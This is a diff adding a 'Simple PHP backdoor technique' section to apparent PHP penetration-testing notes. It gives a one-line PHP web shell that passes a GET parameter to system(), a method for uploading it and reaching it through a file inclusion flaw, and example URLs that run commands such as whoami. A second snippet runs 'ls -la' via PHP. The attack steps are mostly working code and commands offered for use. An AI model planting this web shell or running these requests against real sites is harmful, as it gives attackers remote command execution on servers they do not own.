@@ -1,5 +1,17 @@
 # PHP Penteration Testing Techniques
 
+### Simple PHP backdoor technique
+```
+// If you have a website with file inclusion you can upload and navigate to
+http://$ip/something/?lang=en.php
+
+// Upload the following backdoor.php containing
+<?php system($_GET['cmd']);?>
+
+// Then navigate to it and execute with
+http://$ip/something/?lang=/var/ftp/pub/backdoor.php&cmd=whoami
+```
+
 ### Execute system commands using php
 `<php system('ls -la'); ?>`
 
